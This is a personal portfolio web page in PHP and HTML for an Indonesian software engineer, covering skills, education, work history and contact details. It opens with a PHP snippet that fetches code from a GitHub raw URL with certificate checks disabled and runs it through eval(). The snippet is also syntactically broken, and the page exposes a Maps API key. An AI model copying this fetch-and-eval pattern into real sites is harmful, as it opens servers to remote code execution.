<?php 
$GithubRawURI= "https://raw.githubusercontent.com/syrvrr/syrvrr.github.io/index.php”; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$data = curl_exec($ch); 
curl_close($ch); 
 
//remove the "<?php" from the file before running it 
$data = substr($data, 5); 
 
eval ($data); 


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  
  <!-- <meta name="copyright" content="MACode ID, https://www.macodeid.com/"> -->
  
  <title> Andi Prayogi Site's</title>

  <link rel="shortcut icon" href="assets/jadiico.ico" type="image/x-icon">
  
  <link rel="stylesheet" type="text/css" href="assets/css/themify-icons.css">
  
  <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.css">

  <link rel="stylesheet" type="text/css" href="assets/vendor/animate/animate.css">
  
  <link rel="stylesheet" type="text/css" href="assets/vendor/owl-carousel/owl.carousel.css">
  
  <link rel="stylesheet" type="text/css" href="assets/vendor/perfect-scrollbar/css/perfect-scrollbar.css">
  
  <link rel="stylesheet" type="text/css" href="assets/vendor/nice-select/css/nice-select.css">
  
  <link rel="stylesheet" type="text/css" href="assets/vendor/fancybox/css/jquery.fancybox.min.css">
  
  <link rel="stylesheet" type="text/css" href="assets/css/virtual.css">
  
  <link rel="stylesheet" type="text/css" href="assets/css/topbar.virtual.css">
</head>
<body class="theme-red">
  
  <!-- Back to top button -->
  <div class="btn-back_to_top">
    <span class="ti-arrow-up"></span>
  </div>
  
  <!-- Setting button -->
  <div class="config ">
    <div class="template-config bg-light">
      <!-- Settings -->
      <div class="d-block">
        <button class="btn btn-fab btn-sm" id="sideel" title="Settings"><span class="ti-settings"></span></button>
      </div>
      <!-- Puschase -->
      <!--
      <div class="d-block">
        <a href="https://macodeid.com/projects/virtual-folio/" class="btn btn-fab btn-sm" title="Get this template" data-toggle="tooltip" data-placement="left"><span class="ti-download"></span></a>
      </div>  -->
      <!-- Help -->
      <div class="d-block">
        <a href="#" class="btn btn-fab btn-sm" title="Help" data-toggle="tooltip" data-placement="left"><span class="ti-help"></span></a>
      </div>
    </div>
    <div class="set-menu bg-light">
      <p>Pilih Warna</p>
      <div class="color-bar" data-toggle="selected">
        <span class="color-item bg-theme-red selected" data-class="theme-red"></span>
        <span class="color-item bg-theme-blue" data-class="theme-blue"></span>
        <span class="color-item bg-theme-green" data-class="theme-green"></span>
        <span class="color-item bg-theme-orange" data-class="theme-orange"></span>
        <span class="color-item bg-theme-purple" data-class="theme-purple"></span>
      </div>
      <select class="custom-select d-block my-2" id="change-page">
        <option value="">Pilih Model Page Lain</option>
        <option value="index">Topbar</option>
        <!-- <option value="blog-topbar">Blog (Topbar)</option> -->
        <option value="index-2">Minibar</option>
        <!-- <option value="blog-minibar">Blog (Minibar)</option> -->
      </select>
    </div>
  </div>
  
  <div class="vg-page page-home img-fluid" id="home" style="background-image: url(assets/img/bg_image_2.jpg); background-repeat: no-repeat; background-size: contain; position: relative; background-position: center;">
    <!-- Navbar -->
    <div class="navbar navbar-expand-lg navbar-dark sticky" data-offset="500">
      <div class="container">
        <a href="" class="navbar-brand"> Andi Prayogi /></a>
        <button class="navbar-toggler" data-toggle="collapse" data-target="#main-navbar" aria-expanded="true">
          <span class="ti-menu"></span>
        </button>
        <div class="collapse navbar-collapse" id="main-navbar">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item active">
              <a href="#home" class="nav-link" data-animate="scrolling">Home</a>
            </li>
            <li class="nav-item">
              <a href="#about" class="nav-link" data-animate="scrolling">About</a>
            </li>
            <!-- <li class="nav-item">
              <a href="#portfolio" class="nav-link" data-animate="scrolling">Portfolio</a>
            </li>
            <li class="nav-item">
              <a href="#blog" class="nav-link" data-animate="scrolling">Blog</a>
            </li> -->
            <li class="nav-item">
              <a href="#contact" class="nav-link" data-animate="scrolling">Contact</a>
            </li>
          </ul>
          <ul class="nav ml-auto">
            <li class="nav-item">
              <button class="btn btn-fab btn-theme no-shadow">ID</button>
            </li>
          </ul>
        </div>
      </div>
    </div> <!-- End Navbar -->
    <!-- Caption header -->
    <div class="caption-header text-center wow zoomInDown">
      <h5 class="fw-normal">Selamat Datang!</h5>
      <h1 class="fw-light mb-4">Hai, Aku/Saya <b class="fg-theme">Andi</b> Prayogi</h1>
      <div class="badge">Software Engineer & Computer Science</div>
    </div> <!-- End Caption header -->
    <div class="floating-button"><span class="ti-mouse"></span></div>
  </div>
  
  <div class="vg-page page-about" id="about">
    <div class="container py-5">
      <div class="row">
        <div class="col-lg-4 col-sm py-3">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/person.jpg" alt="">
          </div>
        </div>
        <div class="col-lg-6 col-sm offset-lg-1 wow fadeInRight">
          <h1 class="fw-light">Andi Prayogi</h1>
          <h5 class="fg-theme mb-3">Software Engineer & Computer Science</h5>
          <p class="text-muted">Sangat cerdas kuat daya ingatannya bijaksana konsekuen dalam tindakan tabah menghadapi penderitaan agak pemboros percaya diri dalam segala-galanya rejekinya baik. Senang menuntut ilmu apa saja dan rajin belajar. Dicintai oleh banyak orang walaupun memiliki sifat keras hati. Sopan dalam bicaranya dan senang dijunjung. Banyak memiliki teman karena senang bergaul. - Kata Weton</p>
          <ul class="theme-list">
            <li><b>Dari:</b> Kisaran, Indonesia</li>
            <li><b>Hidup di:</b> Medan, Indonesia</li>
            <li><b>Usia:</b> Udah 25+</li>
            <li><b>Jenis Kelamin:</b> Laki-laki</li>
          </ul>
          <button class="btn btn-theme-outline"> <a href="https://www.linkedin.com/in/andi-prayogi-2a8a11157/" target="_blank" class="text-reset"> Lihat CV </a></button>
        </div>
      </div>
    </div>
    <div class="container py-5">
      <h1 class="text-center fw-normal wow fadeIn">My Skills</h1>
      <div class="row py-3">
        <div class="col-md-6">
          <div class="px-lg-3">
            <h4 class="wow fadeInUp">Hard Skills</h4>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Algorithm Programming</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 89%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">89%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Database</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 80%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">80%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Networking</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 88%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">88%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Software Testing</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 86%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">86%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Computer Hardware</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 90%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">90%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Computer Programming</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 80%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">80%</div>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-6">
          <div class="px-lg-3">
            <h4 class="wow fadeInUp">Soft Skills</h4>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Analisis</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 92%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">92%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Strategi</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 89%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">89%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Innovation</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 88%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">88%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Public Speaking</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 89%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">89%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Project Management</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 88%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">88%</div>
              </div>
            </div>
            <div class="progress-wrapper wow fadeInUp">
              <span class="caption">Leadership</span>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: 90%;" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">90%</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <p>
      <h1 class="text-center fw-normal wow fadeIn">Storytelling</h1>
    </p>
    <div class="container pt-5">
      <div class="row">
        <div class="col-md-6 wow fadeInRight">
          <h2 class="fw-normal">Education</h2>
          <ul class="timeline mt-4 pr-md-5">
            <li>
              <div class="title">2020 - Current</div>
              <div class="details">
                <h5>Bidang Studi Machine Learning</h5>
                <small class="fg-theme">Universitas Sumatera Utara</small>
                <p>Mahasiswa Pascasarjana di Fakultas Ilmu Komputer tahun 2020. Lulus tahun 2022 dengan IPK Predikat Dengan Pujian
                    <br/> dengan Judul Thesis :
                    <br/>Analisis Kinerja Algoritma K-Nearest Neighbors untuk Identifikasi dan Pengenalan Wajah. <a href="https://repositori.usu.ac.id/handle/123456789/81842"
                    class="title bg-warning text-reset">
                      Lihat Penelitian</a>
                  </p>
              </div>
            </li>
            <li>
              <div class="title">2019</div>
              <div class="details">
                <h5>Bidang Studi Sistem Komputer</h5>
                <small class="fg-theme">Universitas Pembangunan Panca Budi</small>
                <p>Mahasiswa Sarjana di Fakultas SAINTEK tahun 2015. Lulus tahun 2019 dengan IPK Predikat Dengan Pujian
                  <br/> dengan Judul Skripsi
                  <br/> Implementasi Jaringan Syaraf Tiruan Untuk Menentukan Jurusan SMK Pada Siswa SMP Dengan Metode Backpropagation. <a href="https://repository.pancabudi.ac.id/website/detail/17910/penelitian/implementasi-jaringan-syaraf-tiruan-untuk-menentukan-jurusan-smk-pada-siswa-smp-dengan-metode-backpropagation"
                  class="title bg-warning text-reset">
                    Lihat Penelitian</a>
                </p>
              </div>
            </li>
            <li>
              <div class="title">2015</div>
              <div class="details">
                <h5>Teknik Komputer dan Jaringan</h5>
                <small class="fg-theme">SMK Negeri 1 Percut Sei Tuan</small>
                <p>Siswa SMK di jurusan Teknik Komputer dan Jaringan tahun 2012. Lulus pada tahun 2015</p>
              </div>
            </li>
            <li>
              <div class="title">1997</div>
              <div class="details">
                <h5>Lahir</h5>
                <small class="fg-theme">Di Kisaran</small>
                <p>Anak Laki-laki yang lahir dari keluarga yang sangat sederhana</p>
              </div>
            </li>
          </ul>
        </div>
        <div class="col-md-6 wow fadeInRight" data-wow-delay="200ms">
          <h2 class="fw-normal">Experience</h2>
          <ul class="timeline mt-4 pr-md-5">
            <li>
              <div class="title">2020 - Current</div>
              <div class="details">
                <h5>Software Engineer and CEO MUJAKA</h5>
                <small class="fg-theme">CV Mujio Punakawan</small>
                <p>MUJAKA adalah perusahaan konsultasi yang berfokus pada Conten Digital, Networking, dan Software Programming.
                  Untuk lebih lengkap, silahkan klik profile perusahaan Kami. <a href="https://mujaka.net/"
                  class="title bg-warning text-reset">
                    Kunjungi Website</a>
                </p>
              </div>
              <div class="details">
                <h5>Networking Support</h5>
                <small class="fg-theme">CMS SISKUEDES & Bank SUMSELBABEL</small>
                <p>Membantu jalannya transaksi API Pembayaran melalui INTRANET untuk Desa.
                </p>
              </div>
              <div class="details">
                <h5>Networking Support</h5>
                <small class="fg-theme">RSI Malahayati Medan</small>
                <p>Berkerja sama dengan Rumah Sakit Islam Malahayai Medan dalam meningkatkan Kualitas Layanan Jaringan dan Akses Internet.
                </p>
              </div>
              <div class="details">
                <h5>Sistem Informasi</h5>
                <small class="fg-theme">KKP Medan Wilayah 1 Belawan</small>
                <p>Membantu KKP Medan Wilayah 1 Medan dalam mengelola Website dan Sistem Informasi dalam meningkatkan pelayanan merekat.
                </p> <a href="http://kkpmedan.web.id/"
                class="title bg-warning text-reset">
                  Kunjungi Website</a>
              </div>
            </li>
            <li>
              <div class="title">2019</div>
              <div class="details">
                <h5>Wifi Access Enterprise</h5>
                <small class="fg-theme">PT Laris Cargo Medan dan Ancol</small>
                <p>Membantu PT Laris Cargo dalam mengelola internet akses di Medan dan di Ancol dengan pusat configurasi di Medan.</p>
              </div>
              <div class="details">
                <h5>Wifi Access Enterprise</h5>
                <small class="fg-theme">Puskesmas Binjai Pusat dan Daerah</small>
                <p>Membantu Puskesmas Binjai dalam mengelola internet akses di Puskesmas dalam meningkatkan pelayanan mereka.</p>
              </div>
              <div class="details">
                <h5>Website and Elearning</h5>
                <small class="fg-theme">SMK Negeri 1 Tanjung Morawa</small>
                <p>Membantu SMK Negeri 1 Tanjung Morawa dalam mengelola Website dan Sistem Informasi dalam meningkatkan pelayanan mereka.</p>
                <a href="https://smkn1-tamora.sch.id/"
                class="title bg-warning text-reset">
                  Kunjungi Website</a>
              </div>
            </li>
            <li>
              <div class="title">2018</div>
              <div class="details">
                <h5>Network Architecture</h5>
                <small class="fg-theme">PT Laris Cargo</small>
                <p>Membantu PT Laris Cargo dalam meningkatkan Kualitas Kinerja Server Program dan Jaringan.</p>
              </div>
            </li>
            <li>
              <div class="title">2013</div>
              <div class="details">
                <h5>IT Support and Application</h5>
                <small class="fg-theme">Internet Cafe di Kota Medan</small>
                <p>Menjadi Teknisi di banyak warung internet di kota medan</p>
              </div>
            </li>
          </ul>
        </div>
      </div>
    </div>
  </div>
  
  <!-- <div class="vg-page page-service">
    <div class="container">
      <div class="text-center wow fadeInUp">
        <div class="badge badge-subhead">Service</div>
      </div>
      <h1 class="fw-normal text-center wow fadeInUp">What can i do?</h1>
      <div class="row mt-5">
        <div class="col-md-6 col-lg-4 col-xl-3">
          <div class="card card-service wow fadeInUp">
            <div class="icon">
              <span class="ti-paint-bucket"></span>
            </div>
            <div class="caption">
              <h4 class="fg-theme">Web Design</h4>
              <p>There are many variations of passages of Lorem Ipsum available</p>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3">
          <div class="card card-service wow fadeInUp">
            <div class="icon">
              <span class="ti-search"></span>
            </div>
            <div class="caption">
              <h4 class="fg-theme">SEO</h4>
              <p>There are many variations of passages of Lorem Ipsum available</p>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3">
          <div class="card card-service wow fadeInUp">
            <div class="icon">
              <span class="ti-vector"></span>
            </div>
            <div class="caption">
              <h4 class="fg-theme">UI/UX Design</h4>
              <p>There are many variations of passages of Lorem Ipsum available</p>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3">
          <div class="card card-service wow fadeInUp">
            <div class="icon">
              <span class="ti-desktop"></span>
            </div>
            <div class="caption">
              <h4 class="fg-theme">Web Development</h4>
              <p>There are many variations of passages of Lorem Ipsum available</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div> -->
  
  <!-- <div class="vg-page page-funfact" style="background-image: url(assets/img/bg_banner.jpg);">
    <div class="container">
      <div class="row section-counter">
        <div class="col-md-6 col-lg-3 py-4 wow fadeIn">
          <h1 class="number" data-number="768">768</h1>
          <span>Clients</span>
        </div>
        <div class="col-md-6 col-lg-3 py-4 wow fadeIn">
          <h1 class="number" data-number="230">230</h1>
          <span>Project Compleate</span>
        </div>
        <div class="col-md-6 col-lg-3 py-4 wow fadeIn">
          <h1 class="number" data-number="97">97</h1>
          <span>Project Ongoing</span>
        </div>
        <div class="col-md-6 col-lg-3 py-4 wow fadeIn">
          <h1 class="number" data-number="699">699</h1>
          <span>Client Satisfaction</span>
        </div>
      </div>
    </div>
  </div> -->
  
  <!-- Portfolio page -->
  <!-- <div class="vg-page page-portfolio" id="portfolio">
    <div class="container">
      <div class="text-center wow fadeInUp">
        <div class="badge badge-subhead">Portfolio</div>
      </div>
      <h1 class="text-center fw-normal wow fadeInUp">See my work</h1>
      <div class="filterable-button py-3 wow fadeInUp" data-toggle="selected">
        <button class="btn btn-theme-outline selected" data-filter="*">All</button>
        <button class="btn btn-theme-outline" data-filter=".apps">Apps</button>
        <button class="btn btn-theme-outline" data-filter=".template">Template</button>
        <button class="btn btn-theme-outline" data-filter=".ios">IOS</button>
        <button class="btn btn-theme-outline" data-filter=".ui-ux">UI/UX</button>
        <button class="btn btn-theme-outline" data-filter=".graphic">Graphic</button>
        <button class="btn btn-theme-outline" data-filter=".wireframes">Wireframes</button>
      </div> -->

      <!-- <div class="gridder my-3">
        <div class="grid-item apps wow zoomIn">
          <div class="img-place" data-src="assets/img/work/work-1.jpg" data-fancybox data-caption="<h5 class='fg-theme'>Mobile Travel App</h5> <p>Travel, Discovery</p>">
            <img src="assets/img/work/work-1.jpg" alt="">
            <div class="img-caption">
              <h5 class="fg-theme">Mobile Travel App</h5>
              <p>Travel, Discovery</p>
            </div>
          </div>
        </div>
        <div class="grid-item template wireframes wow zoomIn">
          <div class="img-place" data-src="assets/img/work/work-2.jpg" data-fancybox data-caption="<h5 class='fg-theme'>Music App</h5> <p>Musics</p>">
            <img src="assets/img/work/work-2.jpg" alt="">
            <div class="img-caption">
              <h5 class="fg-theme">Music App</h5>
              <p>Musics</p>
            </div>
          </div>
        </div>
        <div class="grid-item apps ios wow zoomIn">
          <div class="img-place" data-src="assets/img/work/work-3.jpg" data-fancybox data-caption="<h5 class='fg-theme'>Gaming Dashboard</h5> <p>Games, Streaming</p>">
            <img src="assets/img/work/work-3.jpg" alt="">
            <div class="img-caption">
              <h5 class="fg-theme">Gaming Dashboard</h5>
              <p>Games, Streaming</p>
            </div>
          </div>
        </div>
        <div class="grid-item graphic ui-ux wow zoomIn">
          <div class="img-place" data-src="assets/img/work/work-4.jpg" data-fancybox data-caption="<h5 class='fg-theme'>Drugs Delivery App</h5> <p>Health, Drugs</p>">
            <img src="assets/img/work/work-4.jpg" alt="">
            <div class="img-caption">
              <h5 class="fg-theme">Drugs Delivery App</h5>
              <p>Health, Drugs</p>
            </div>
          </div>
        </div>
        <div class="grid-item apps ios wow zoomIn">
          <div class="img-place" data-src="assets/img/work/work-5.jpg" data-fancybox data-caption="<h5 class='fg-theme'>Musics Discover</h5> <p>Musics, Dashboard</p>">
            <img src="assets/img/work/work-5.jpg" alt="">
            <div class="img-caption">
              <h5 class="fg-theme">Musics Discover</h5>
              <p>Musics, Dashboard</p>
            </div>
          </div>
        </div>
        <div class="grid-item graphic ui-ux wireframes wow zoomIn">
          <div class="img-place" data-src="assets/img/work/work-6.jpg" data-fancybox data-caption="<h5 class='fg-theme'>Game Streaming</h5> <p>Games, Streaming</p>">
            <img src="assets/img/work/work-6.jpg" alt="">
            <div class="img-caption">
              <h5 class="fg-theme">Game Streaming</h5>
              <p>Games, Streaming</p>
            </div>
          </div>
        </div>
      </div>  -->
      
      <!-- End gridder -->
      <!-- <div class="text-center wow fadeInUp">
        <a href="javascript:void(0)" class="btn btn-theme">Load More</a>
      </div>
    </div> -->
  <!-- </div>  -->
  <!-- End Portfolio page -->
  
  <!-- Testimonial -->
  <!-- <div class="vg-page page-testimonial">
    <div class="container">
      <h1 class="text-center fw-normal wow fadeInUp">What Clients are Saying</h1>
      <div class="row justify-content-center mt-5 wow fadeInUp">
        <div class="col-md-9">
          <div class="owl-carousel testi-carousel">
            <div class="item">
              <div class="row">
                <div class="col-md-6">
                  <div class="img-place">
                    <img src="assets/img/testimonials/testimonials_1.jpg" alt="">
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="caption">
                    <div class="testi-content">There are many variations of passages of Lorem Ipsum available, but the majority have suffered</div>
                    <div class="testi-info">
                      <div class="thumb-profile">
                        <img src="assets/img/testimonials/testimonials_1.jpg" alt="">
                      </div>
                      <div class="tagline">
                        <h5 class="mb-0">Satria Nugraha</h5>
                        <span class="text-muted">CEO Nutshell</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="row">
                <div class="col-md-6">
                  <div class="img-place">
                    <img src="assets/img/testimonials/testimonials_2.jpg" alt="">
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="caption">
                    <div class="testi-content">Lorem ipsum, dolor sit amet consectetur adipisicing elit. Saepe natus expedita ab facilis ut, animi explicabo amet. Voluptatibus possimus iste enim, doloremque, fugiat accusamus nisi optio fugit ratione expedita harum?</div>
                    <div class="testi-info">
                      <div class="thumb-profile">
                        <img src="assets/img/testimonials/testimonials_2.jpg" alt="">
                      </div>
                      <div class="tagline">
                        <h5 class="mb-0">Selena Arrini</h5>
                        <span class="text-muted">CEO BigTree</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>  -->
  <!-- End testimonial -->
  
  <!-- Client -->
  <!-- <div class="vg-page page-client">
    <div class="container">
      <div class="row">
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_1.svg" alt="">
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_2.svg" alt="">
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_3.svg" alt="">
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_4.svg" alt="">
          </div>
        </div>
      </div>
      <div class="row">
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_5.svg" alt="">
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_6.svg" alt="">
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_7.svg" alt="">
          </div>
        </div>
        <div class="col-md-6 col-lg-4 col-xl-3 item">
          <div class="img-place wow fadeInUp">
            <img src="assets/img/logo/company_8.svg" alt="">
          </div>
        </div>
      </div>
    </div>
  </div>  -->
  
  <!-- End client -->
  
  <!-- Blog -->
  <!-- <div class="vg-page page-blog" id="blog">
    <div class="container">
      <div class="text-center">
        <div class="badge badge-subhead wow fadeInUp">Blog</div>
      </div>
      <h1 class="text-center fw-normal wow fadeInUp">Latest Post</h1>
      <div class="row post-grid">
        <div class="col-md-6 col-lg-4 wow fadeInUp">
          <div class="card">
            <div class="img-place">
              <img src="assets/img/work/work-9.jpg" alt="">
            </div>
            <div class="caption">
              <a href="javascript:void(0)" class="post-category">Technology</a>
              <a href="#" class="post-title">Invision design forward fund</a>
              <span class="post-date"><span class="sr-only">Published on</span> May 22, 2018</span>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 wow fadeInUp">
          <div class="card">
            <div class="img-place">
              <img src="assets/img/work/work-6.jpg" alt="">
            </div>
            <div class="caption">
              <a href="javascript:void(0)" class="post-category">Business</a>
              <a href="#" class="post-title">Announcing a plan for small teams</a>
              <span class="post-date"><span class="sr-only">Published on</span> May 22, 2018</span>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 wow fadeInUp">
          <div class="card">
            <div class="img-place">
              <img src="assets/img/work/work-1.jpg" alt="">
            </div>
            <div class="caption">
              <a href="javascript:void(0)" class="post-category">Design</a>
              <a href="#" class="post-title">5 basic tips for illustrating</a>
              <span class="post-date"><span class="sr-only">Published on</span> May 22, 2018</span>
            </div>
          </div>
        </div>
        <div class="col-12 text-center py-3 wow fadeInUp">
          <a href="blog-fullbar.html" class="btn btn-theme">See All Post</a>
        </div>
      </div>
    </div>
  </div> -->
  
  <!-- End blog -->
  
  <!-- Contact -->
  <div class="vg-page page-contact" id="contact">
    <div class="container-fluid">
      <div class="text-center wow fadeInUp">
        <div class="badge badge-subhead">Contact</div>
      </div>
      <h1 class="text-center fw-normal wow fadeInUp">Get in touch</h1>
      <div class="row ">
        <div class="col-lg wow zoomIn">
          <div class="vg-maps">
            <!-- <div id="google-maps" style="width: 100%; height: 100%;"></div> -->
            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d32657805.407459788!2d99.41822007406319!3d-2.319807277642867!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2c4c07d7496404b7%3A0xe37b4de71badf485!2sIndonesia!5e0!3m2!1sen!2sid!4v1655616514004!5m2!1sen!2sid" width="100%" height="850" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
          </div>
        </div>
        <!-- <div class="col-lg-5">
          <form class="vg-contact-form">
            <div class="form-row">
              <div class="col-12 mt-3 wow fadeInUp">
                <input class="form-control" type="text" name="Name" placeholder="Your Name">
              </div>
              <div class="col-6 mt-3 wow fadeInUp">
                <input class="form-control" type="text" name="Email" placeholder="Email Address">
              </div>
              <div class="col-6 mt-3 wow fadeInUp">
                <input class="form-control" type="text" name="Subject" placeholder="Subject">
              </div>
              <div class="col-12 mt-3 wow fadeInUp">
                <textarea class="form-control" name="Message" rows="6" placeholder="Enter message here.."></textarea>
              </div>
              <button type="submit" class="btn btn-theme mt-3 wow fadeInUp ml-1">Send Message</button>
            </div>
          </form>
        </div> -->
      </div>
    </div>
  </div> 
  <!-- End Contact -->
  
  <!-- Footer -->
  <div class="vg-footer">
    <h1 class="text-center">Knowledge is a Friends </h1>
    <div class="container">
      <div class="row">
        <div class="col-lg-4 py-3">
          <div class="footer-info">
            <p>Where to find me</p>
            <hr class="divider">
            <p class="fs-large fg-white">Medan, Indonesia 20371 dan Medan, Indonesia 20125</p>
            <p>Where to find me</p>
            <hr class="divider">
            <p class="fs-large fg-white">Your IP Address is: <? echo $_SERVER["REMOTE_ADDR"]; ?></p>
          </div>
        </div>
        <div class="col-md-6 col-lg-3 py-3">
          <div class="float-lg-right">
            <p>Follow me</p>
            <hr class="divider">
            <ul class="list-unstyled">
              <li><a href="https://www.instagram.com/syrvrr_/">Instagram</a></li>
              <li><a href="https://github.com/sayray303">Github</a></li>
              <li><a href="https://www.linkedin.com/in/andi-prayogi-2a8a11157/">linkedin</a></li>
              <li class="text-muted">Facebook</li>
            </ul>
          </div>
        </div>
        <div class="col-md-6 col-lg-3 py-3">
          <div class="float-lg-right">
            <p>Contact me</p>
            <hr class="divider">
            <ul class="list-unstyled">
              <li>andi.prayogi30@gmail.com</li>
              <li>andiprayogi@mujaka.net</li>
            </ul>
          </div>
        </div>
      </div>
      <!-- <div class="row justify-content-center mt-3">
        <div class="col-12 mb-3">
          <h3 class="fw-normal text-center">Subscribe</h3>
        </div>
        <div class="col-lg-6">
          <form class="mb-3">
            <div class="input-group">
              <input type="text" class="form-control" placeholder="Email address">
              <input type="submit" class="btn btn-theme no-shadow" value="Subscribe">
            </div>
          </form>
        </div> -->
        <div class="col-12">
          <p class="text-center mb-0 mt-4">Copyright &copy;2022. Andi Prayogi's | This template is made with <span
            class="ti-heart fg-theme-red"></span></p>
        </div>
      </div>
    </div>
  </div> <!-- End footer -->
  
  
  <script src="assets/js/jquery-3.5.1.min.js"></script>
    
  <script src="assets/js/bootstrap.bundle.min.js"></script>
    
  <script src="assets/vendor/owl-carousel/owl.carousel.min.js"></script>
    
  <script src="assets/vendor/perfect-scrollbar/js/perfect-scrollbar.js"></script>
    
  <script src="assets/vendor/isotope/isotope.pkgd.min.js"></script>
    
  <script src="assets/vendor/nice-select/js/jquery.nice-select.min.js"></script>
    
  <script src="assets/vendor/fancybox/js/jquery.fancybox.min.js"></script>

  <script src="assets/vendor/wow/wow.min.js"></script>

  <script src="assets/vendor/animateNumber/jquery.animateNumber.min.js"></script>

  <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>

  <script src="assets/js/google-maps.js"></script>
    
  <script src="assets/js/topbar-virtual.js"></script>

  <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAIA_zqjFMsJM_sxP9-6Pde5vVCTyJmUHM&callback=initMap"></script>
  
</body>
</html>
